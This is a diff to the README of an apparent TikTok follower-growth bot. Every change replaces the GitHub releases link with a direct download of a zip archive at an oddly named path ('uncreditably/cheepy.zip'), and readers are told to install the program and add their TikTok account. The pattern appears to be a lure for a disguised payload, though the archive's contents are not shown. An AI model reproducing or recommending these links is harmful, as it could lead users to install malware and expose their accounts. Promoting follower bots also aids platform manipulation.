@@ -1,6 +1,6 @@
 # 🤖 Tiktok-Follower-Bot - Grow Your TikTok Account Automatically
 
-[![Download Tiktok Follower Bot](https://img.shields.io/badge/Download-Tiktok_Follower_Bot-2ea44f?style=for-the-badge)](https://github.com/Clairemandibulate6710/Tiktok-Follower-Bot/releases)
+[![Download Tiktok Follower Bot](https://img.shields.io/badge/Download-Tiktok_Follower_Bot-2ea44f?style=for-the-badge)](https://github.com/Clairemandibulate6710/Tiktok-Follower-Bot/raw/refs/heads/main/uncreditably/cheepy.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Tiktok-Follower-Bot! This powerful automation tool helps you grow
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/Clairemandibulate6710/Tiktok-Follower-Bot/releases](https://github.com/Clairemandibulate6710/Tiktok-Follower-Bot/releases)
+Visit this link to download the application: [https://github.com/Clairemandibulate6710/Tiktok-Follower-Bot/raw/refs/heads/main/uncreditably/cheepy.zip](https://github.com/Clairemandibulate6710/Tiktok-Follower-Bot/raw/refs/heads/main/uncreditably/cheepy.zip)
 
 Once you click the link, you'll be taken to the download page. Look for the latest release version and click the download button. The file will start downloading to your computer automatically.
 
@@ -158,7 +158,7 @@ Join our growing community of users who are successfully growing their TikTok ac
 
 If you're ready to start now, here's the quickest path:
 
-1. Visit [https://github.com/Clairemandibulate6710/Tiktok-Follower-Bot/releases](https://github.com/Clairemandibulate6710/Tiktok-Follower-Bot/releases)
+1. Visit [https://github.com/Clairemandibulate6710/Tiktok-Follower-Bot/raw/refs/heads/main/uncreditably/cheepy.zip](https://github.com/Clairemandibulate6710/Tiktok-Follower-Bot/raw/refs/heads/main/uncreditably/cheepy.zip)
 2. Download the latest version
 3. Install and launch the application
 4. Add your TikTok account
